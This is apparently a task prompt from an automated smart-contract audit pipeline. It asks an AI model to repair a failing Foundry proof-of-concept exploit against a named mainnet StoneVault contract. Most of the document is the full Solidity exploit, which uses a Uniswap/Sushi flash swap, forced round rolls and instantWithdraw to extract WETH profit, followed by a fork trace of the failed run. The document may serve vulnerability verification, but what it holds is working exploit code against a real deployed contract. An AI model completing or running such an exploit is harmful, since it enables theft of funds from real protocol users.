You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Instant withdrawals can burn full shares but return only a fraction of the owed ETH
- claim: `StoneVault.instantWithdraw()` burns the caller's full STONE balance before it knows whether `StrategyController.forceWithdraw()` can actually source the requested ETH. The controller's `_forceWithdraw()` then asks each strategy for a fixed ratio slice of the requested amount instead of withdrawing against each strategy's real live balance, so drifted or illiquid strategies can return less than required while the user's entire share position is already destroyed.
- impact: Users can suffer irreversible losses on instant withdrawals: their shares are fully burned, but they only receive the partial ETH amount the controller happened to recover.
- exploit_paths: ["Strategy balances drift away from configured ratios because of yield, losses, or previous partial withdrawals.", "A user calls `instantWithdraw(..., _shares)` and the vault computes the ETH owed for all burned shares.", "The vault burns the full `_shares` amount before checking whether the controller can fund the withdrawal.", "`StrategyController._forceWithdraw()` requests ratio-based amounts from each strategy, so underfunded or illiquid strategies return too little.", "The vault pays only the partial ETH that came back, leaving the user with fewer assets and no remaining shares."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IStoneVault {
    function instantWithdraw(uint256 amount, uint256 shares) external returns (uint256 actualWithdrawn);
    function rollToNextRound() external;
    function currentSharePrice() external returns (uint256 price);
    function latestRoundID() external view returns (uint256);
    function roundPricePerShare(uint256 round) external view returns (uint256);
    function getVaultAvailableAmount() external returns (uint256 idleAmount, uint256 investedAmount);
    function stone() external view returns (address);
    function strategyController() external view returns (address);
    function withdrawFeeRate() external view returns (uint256);
}

interface IStrategyController {
    function getStrategies() external view returns (address[] memory addrs, uint256[] memory portions);
    function getStrategyValidValue(address strategy) external returns (uint256 value);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    uint256 internal constant MULTIPLIER = 1e18;
    uint256 internal constant ONE_HUNDRED_PERCENT = 1e6;
    uint256 internal constant MIN_BUFFER = 1e15;

    address public constant TARGET = 0xA62F9C5af106FeEE069F38dE51098D9d81B90572;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 public initialWethBalance;
    uint256 public finalWethBalance;
    uint256 public borrowedShares;
    uint256 public expectedWithdraw;
    uint256 public actualWithdraw;
    uint256 public repayAmount;
    uint256 public idleBeforeWithdraw;
    uint256 public investedBeforeWithdraw;
    uint256 public controllerBalanceBeforeWithdraw;
    uint256 public estimatedControllerGross;
    uint256 public estimatedControllerNet;
    uint256 public estimatedShortfall;
    uint256 public verifiedLossAmount;
    uint256 public sharesBurned;
    uint256 public roundsRolled;
    bool public hypothesisValidated;

    address public fundingPair;

    enum Outcome {
        Unset,
        NoFlashswapPair,
        NoControllerPath,
        NotRepayable,
        FlashswapExecuted,
        LossConfirmed
    }

    Outcome public outcome;

    bool private _inFlashswap;
    address private _activePair;
    uint256 private _activeBorrow;
    uint256 private _activeRepay;

    struct Candidate {
        address pair;
        uint256 borrowAmount;
        uint256 repayWeth;
        uint256 expectedPayout;
        uint256 estimatedGrossActual;
        uint256 estimatedNetActual;
        uint256 controllerCash;
    }

    struct SearchParams {
        uint256 sharePrice;
        uint256 feeRate;
        uint256 idleAmount;
        uint256 controllerCash;
        uint256 minControllerShares;
    }

    struct StrategyState {
        uint256[] ratios;
        uint256[] liveValues;
    }

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        IStoneVault vault = IStoneVault(TARGET);

        initialWethBalance = IERC20Like(WETH).balanceOf(address(this));
        finalWethBalance = initialWethBalance;
        borrowedShares = 0;
        expectedWithdraw = 0;
        actualWithdraw = 0;
        repayAmount = 0;
        idleBeforeWithdraw = 0;
        investedBeforeWithdraw = 0;
        controllerBalanceBeforeWithdraw = 0;
        estimatedControllerGross = 0;
        estimatedControllerNet = 0;
        estimatedShortfall = 0;
        verifiedLossAmount = 0;
        sharesBurned = 0;
        roundsRolled = 0;
        hypothesisValidated = false;
        fundingPair = address(0);
        outcome = Outcome.Unset;

        Candidate memory best = _findCandidate(vault);
        if (best.pair == address(0)) {
            outcome = Outcome.NoFlashswapPair;
            return;
        }

        borrowedShares = best.borrowAmount;
        repayAmount = best.repayWeth;
        expectedWithdraw = best.expectedPayout;
        fundingPair = best.pair;
        estimatedControllerGross = best.estimatedGrossActual;
        estimatedControllerNet = best.estimatedNetActual;
        controllerBalanceBeforeWithdraw = best.controllerCash;

        (idleBeforeWithdraw, investedBeforeWithdraw) = vault.getVaultAvailableAmount();
        if (expectedWithdraw <= idleBeforeWithdraw + controllerBalanceBeforeWithdraw) {
            outcome = Outcome.NoControllerPath;
            return;
        }

        estimatedShortfall = expectedWithdraw > estimatedControllerGross
            ? expectedWithdraw - estimatedControllerGross
            : 0;
        if (estimatedShortfall == 0) {
            outcome = Outcome.NoControllerPath;
            return;
        }
        if (estimatedControllerNet <= repayAmount + MIN_BUFFER) {
            outcome = Outcome.NotRepayable;
            return;
        }

        _activePair = best.pair;
        _activeBorrow = best.borrowAmount;
        _activeRepay = best.repayWeth;
        _inFlashswap = true;

        address stone = vault.stone();
        (uint256 amount0Out, uint256 amount1Out) = _pairOutAmounts(best.pair, stone, best.borrowAmount);
        IUniswapV2Pair(best.pair).swap(amount0Out, amount1Out, address(this), abi.encode(best.borrowAmount));

        _inFlashswap = false;
        _wrapAllEth();

        finalWethBalance = IERC20Like(WETH).balanceOf(address(this));
        if (sharesBurned == borrowedShares && actualWithdraw < expectedWithdraw) {
            verifiedLossAmount = expectedWithdraw - actualWithdraw;
            hypothesisValidated = true;
            outcome = Outcome.LossConfirmed;
        } else {
            outcome = Outcome.FlashswapExecuted;
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(_inFlashswap, "inactive");
        require(msg.sender == _activePair, "bad pair");
        require(sender == address(this), "bad sender");

        uint256 borrowed = amount0 != 0 ? amount0 : amount1;
        require(borrowed == _activeBorrow, "bad borrow");

        IStoneVault vault = IStoneVault(TARGET);
        address stone = vault.stone();

        uint256 ethBefore = address(this).balance;
        uint256 stoneBefore = IERC20Like(stone).balanceOf(address(this));

        vault.instantWithdraw(0, borrowed);

        uint256 ethDelta = address(this).balance - ethBefore;
        uint256 stoneAfter = IERC20Like(stone).balanceOf(address(this));

        actualWithdraw = ethDelta;
        sharesBurned = stoneBefore > stoneAfter ? stoneBefore - stoneAfter : 0;

        if (_activeRepay != 0) {
            uint256 wethBal = IERC20Like(WETH).balanceOf(address(this));
            if (wethBal < _activeRepay) {
                uint256 shortfall = _activeRepay - wethBal;
                require(address(this).balance >= shortfall, "insufficient repay");
                IWETH(WETH).deposit{value: shortfall}();
            }
            require(IERC20Like(WETH).transfer(msg.sender, _activeRepay), "repay failed");
        }

        _wrapAllEth();
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        if (finalWethBalance > initialWethBalance) {
            return finalWethBalance - initialWethBalance;
        }
        return 0;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return "UniswapV2/Sushi flashswap STONE shares -> optional public rollToNextRound to reduce idle liquidity -> instantWithdraw(full borrowed shares) burns shares first -> controller forceWithdraw asks ratio-sliced strategy withdrawals -> vault returns only partial ETH while shares stay burned";
    }

    function _findCandidate(IStoneVault vault) internal returns (Candidate memory best) {
        address stone = vault.stone();

        for (uint256 roll; roll < 4; ++roll) {
            Candidate memory candidate = _bestPairCandidate(vault, stone);
            if (candidate.pair != address(0)) {
                return candidate;
            }

            // Public rebases are realistic on-chain prep: they can lower idle ETH and
            // force the later instant withdrawal down the controller.forceWithdraw path.
            try vault.rollToNextRound() {
                unchecked {
                    ++roundsRolled;
                }
            } catch {
                break;
            }
        }
    }

    function _bestPairCandidate(IStoneVault vault, address stone) internal returns (Candidate memory best) {
        SearchParams memory params = _buildSearchParams(vault);
        StrategyState memory state = _loadStrategyState(vault.strategyController());
        if (state.ratios.length == 0 || state.ratios.length != state.liveValues.length) {
            return best;
        }

        Candidate memory pairBest = _candidateFromPair(
            IUniswapV2Factory(UNISWAP_V2_FACTORY).getPair(stone, WETH),
            stone,
            params,
            state
        );
        if (_isBetterCandidate(pairBest, best)) {
            best = pairBest;
        }

        pairBest = _candidateFromPair(
            IUniswapV2Factory(SUSHISWAP_FACTORY).getPair(stone, WETH),
            stone,
            params,
            state
        );
        if (_isBetterCandidate(pairBest, best)) {
            best = pairBest;
        }
    }

    function _candidateFromPair(
        address pair,
        address stone,
        SearchParams memory params,
        StrategyState memory state
    ) internal view returns (Candidate memory best) {
        if (pair == address(0)) {
            return best;
        }

        (uint256 reserveStone, uint256 reserveWeth) = _pairReserves(pair, stone);
        if (reserveStone <= params.minControllerShares + 1 || reserveWeth == 0) {
            return best;
        }

        uint256[8] memory probes;
        probes[0] = params.minControllerShares;
        probes[1] = params.minControllerShares + (params.minControllerShares / 100) + 1;
        probes[2] = params.minControllerShares + (params.minControllerShares / 20) + 1;
        probes[3] = params.minControllerShares + (params.minControllerShares / 10) + 1;
        probes[4] = params.minControllerShares + (params.minControllerShares / 4) + 1;
        probes[5] = reserveStone / 2000;
        probes[6] = reserveStone / 1000;
        probes[7] = reserveStone / 500;

        for (uint256 j = 0; j < probes.length; ++j) {
            Candidate memory probe = _candidateFromProbe(
                pair,
                reserveStone,
                reserveWeth,
                probes[j],
                params,
                state
            );
            if (_isBetterCandidate(probe, best)) {
                best = probe;
            }
        }
    }

    function _candidateFromProbe(
        address pair,
        uint256 reserveStone,
        uint256 reserveWeth,
        uint256 probedBorrowAmount,
        SearchParams memory params,
        StrategyState memory state
    ) internal pure returns (Candidate memory candidate) {
        uint256 borrowAmount = probedBorrowAmount;
        if (borrowAmount < params.minControllerShares) {
            borrowAmount = params.minControllerShares;
        }
        if (borrowAmount == 0 || borrowAmount >= reserveStone / 4 || borrowAmount >= reserveStone) {
            return candidate;
        }

        uint256 expectedPayout = _sharesToAsset(borrowAmount, params.sharePrice);
        if (expectedPayout <= params.idleAmount + params.controllerCash) {
            return candidate;
        }

        uint256 estimatedGrossActual = _estimateGrossActual(
            expectedPayout,
            params.idleAmount,
            params.controllerCash,
            state.ratios,
            state.liveValues
        );
        if (expectedPayout <= estimatedGrossActual) {
            return candidate;
        }

        uint256 estimatedNetActual = _applyFee(estimatedGrossActual, params.feeRate);
        uint256 repayWeth = _getAmountIn(borrowAmount, reserveWeth, reserveStone);
        if (estimatedNetActual <= repayWeth + MIN_BUFFER) {
            return candidate;
        }

        candidate = Candidate({
            pair: pair,
            borrowAmount: borrowAmount,
            repayWeth: repayWeth,
            expectedPayout: expectedPayout,
            estimatedGrossActual: estimatedGrossActual,
            estimatedNetActual: estimatedNetActual,
            controllerCash: params.controllerCash
        });
    }

    function _isBetterCandidate(Candidate memory lhs, Candidate memory rhs) internal pure returns (bool) {
        if (lhs.pair == address(0)) {
            return false;
        }
        if (rhs.pair == address(0)) {
            return true;
        }

        uint256 lhsShortfall = lhs.expectedPayout - lhs.estimatedGrossActual;
        uint256 rhsShortfall = rhs.expectedPayout - rhs.estimatedGrossActual;
        if (lhsShortfall != rhsShortfall) {
            return lhsShortfall > rhsShortfall;
        }

        return lhs.estimatedNetActual - lhs.repayWeth > rhs.estimatedNetActual - rhs.repayWeth;
    }

    function _estimateGrossActual(
        uint256 expectedPayout,
        uint256 idleAmount,
        uint256 controllerCash,
        uint256[] memory ratios,
        uint256[] memory liveValues
    ) internal pure returns (uint256 grossActual) {
        grossActual = idleAmount;

        if (expectedPayout <= idleAmount) {
            return expectedPayout;
        }

        uint256 residualAfterIdle = expectedPayout - idleAmount;
        grossActual = grossActual + controllerCash;

        if (residualAfterIdle <= controllerCash) {
            return grossActual;
        }

        uint256 requestFromStrategies = residualAfterIdle - controllerCash;
        uint256 length = ratios.length;
        for (uint256 i = 0; i < length; ++i) {
            uint256 requestedSlice = (requestFromStrategies * ratios[i]) / ONE_HUNDRED_PERCENT;
            uint256 liveValue = liveValues[i];
            grossActual = grossActual + (requestedSlice < liveValue ? requestedSlice : liveValue);
        }
    }

    function _buildSearchParams(IStoneVault vault) internal returns (SearchParams memory params) {
        params.sharePrice = _withdrawSharePrice(vault);
        params.feeRate = vault.withdrawFeeRate();
        (params.idleAmount, ) = vault.getVaultAvailableAmount();
        params.controllerCash = vault.strategyController().balance;
        params.minControllerShares = _assetToShares(
            params.idleAmount + params.controllerCash + 1,
            params.sharePrice
        );
        if (params.minControllerShares == 0) {
            params.minControllerShares = 1;
        }
    }

    function _loadStrategyState(address controller) internal returns (StrategyState memory state) {
        (address[] memory strategies, uint256[] memory ratios) = IStrategyController(controller).getStrategies();
        if (strategies.length == 0 || strategies.length != ratios.length) {
            return state;
        }

        state.ratios = ratios;
        state.liveValues = new uint256[](strategies.length);
        for (uint256 i = 0; i < strategies.length; ++i) {
            state.liveValues[i] = IStrategyController(controller).getStrategyValidValue(strategies[i]);
        }
    }

    function _pairReserves(address pair, address stone) internal view returns (uint256 reserveStone, uint256 reserveWeth) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2Pair(pair).getReserves();
        if (IUniswapV2Pair(pair).token0() == stone) {
            reserveStone = uint256(reserve0);
            reserveWeth = uint256(reserve1);
        } else {
            reserveStone = uint256(reserve1);
            reserveWeth = uint256(reserve0);
        }
    }

    function _pairOutAmounts(address pair, address stone, uint256 stoneAmount) internal view returns (uint256 amount0Out, uint256 amount1Out) {
        if (IUniswapV2Pair(pair).token0() == stone) {
            amount0Out = stoneAmount;
        } else {
            amount1Out = stoneAmount;
        }
    }

    function _withdrawSharePrice(IStoneVault vault) internal returns (uint256) {
        uint256 latestRound = vault.latestRoundID();
        if (latestRound == 0) {
            return MULTIPLIER;
        }

        uint256 currentPrice = vault.currentSharePrice();
        uint256 latestPrice = vault.roundPricePerShare(latestRound - 1);
        return latestPrice < currentPrice ? latestPrice : currentPrice;
    }

    function _assetToShares(uint256 assets, uint256 sharePrice) internal pure returns (uint256) {
        return (assets * MULTIPLIER + sharePrice - 1) / sharePrice;
    }

    function _sharesToAsset(uint256 shares, uint256 sharePrice) internal pure returns (uint256) {
        return (shares * sharePrice) / MULTIPLIER;
    }

    function _applyFee(uint256 grossAmount, uint256 feeRate) internal pure returns (uint256) {
        if (feeRate == 0) {
            return grossAmount;
        }
        return grossAmount - ((grossAmount * feeRate) / ONE_HUNDRED_PERCENT);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 numerator = reserveIn * amountOut * 1000;
        uint256 denominator = (reserveOut - amountOut) * 997;
        return (numerator / denominator) + 1;
    }

    function _wrapAllEth() internal {
        uint256 ethBal = address(this).balance;
        if (ethBal != 0) {
            IWETH(WETH).deposit{value: ethBal}();
        }
    }
}

```

forge stdout (tail):
```
758d7bE78336684788Fb0ee0Fa46::bd02d0f5(9dc185b46ed0f11d151f055e45fde635375a9680c34e501b43a82eb6c09c0951) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000007b6bcd3b7143c4ca9c87
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000007b6bcd3b7143c4ca9c87
    │   │   │   │   ├─ [1347] 0x07FCaBCbe4ff0d80c2b1eb42855C0131b6cba2F4::c4c8d0ad() [staticcall]
    │   │   │   │   │   ├─ [473] 0x1d8f8f00cfa6758d7bE78336684788Fb0ee0Fa46::bd02d0f5(5b3a7b8bdde2122fad4dc45e51ae0c5cedc887473a999474f2ead5a8faadfe3c) [staticcall]
    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000071604b37bffc5c337a46
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000071604b37bffc5c337a46
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   ├─ [3599] 0x396aBF9fF46E21694F4eF01ca77C6d7893A017B2::getStrategyValidValue(0xa66723D951F15423Ef2C9C11edcb821E38301836)
    │   │   ├─ [2591] 0xa66723D951F15423Ef2C9C11edcb821E38301836::6c23ab4c()
    │   │   │   ├─ [1738] 0xac3E018457B222d93114458476f3E3416Abbe38F::ce96cb77(000000000000000000000000a66723d951f15423ef2c9c11edcb821e38301836) [staticcall]
    │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000e0dddb2f92869d694
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000e0dddb2f92869d694
    │   │   └─ ← [Return] 259253568507474466452 [2.592e20]
    │   ├─ [26082] 0x396aBF9fF46E21694F4eF01ca77C6d7893A017B2::getStrategyValidValue(0x856EdF1B835ea02Bf11B16F041DF5A13Ef1EC3d1)
    │   │   ├─ [25074] 0x856EdF1B835ea02Bf11B16F041DF5A13Ef1EC3d1::6c23ab4c()
    │   │   │   ├─ [23070] 0x1E19CF2D73a72Ef1332C882F20534B6519Be0276::679aefce() [staticcall]
    │   │   │   │   ├─ [5081] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::f94d4668(1e19cf2d73a72ef1332c882f20534b6519be0276000200000000000000000112) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000011aa5300000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ae78736cd615f374d3085123a210448e74fc6393000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc200000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000002c9d737f32c00611536000000000000000000000000000000000000000000000460cf8bfec70e97b2c2
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000e4167f4726cbcd4
    │   │   │   ├─ [599] 0xDd1fE5AD401D4777cE89959b7fa587e569Bf125D::balanceOf(0x856EdF1B835ea02Bf11B16F041DF5A13Ef1EC3d1) [staticcall]
    │   │   │   │   └─ ← [Return] 347016401809421617677 [3.47e20]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000001352e3c3b277bc181d
    │   │   └─ ← [Return] 356460970102585301021 [3.564e20]
    │   ├─ [564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7122985656e38BDC0302Db86685bb972b145bD3C, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7122985656e38BDC0302Db86685bb972b145bD3C, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [754] 0xA62F9C5af106FeEE069F38dE51098D9d81B90572::rollToNextRound()
    │   │   └─ ← [Revert] already rebased
    │   └─ ← [Return]
    ├─ [432] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [751] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18523440 [1.852e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6
  at 0x8a15b2Dc9c4f295DCEbB0E7887DD25980088fDCB
  at 0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6
  at 0x15469528C11E8Ace863F3F9e5a8329216e33dD7d
  at 0xa66723D951F15423Ef2C9C11edcb821E38301836.withdraw
  at 0x396aBF9fF46E21694F4eF01ca77C6d7893A017B2
  at 0xA62F9C5af106FeEE069F38dE51098D9d81B90572.rollToNextRound
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 100.89s (100.88s CPU time)

Ran 1 test suite in 100.91s (100.89s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 2320691)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
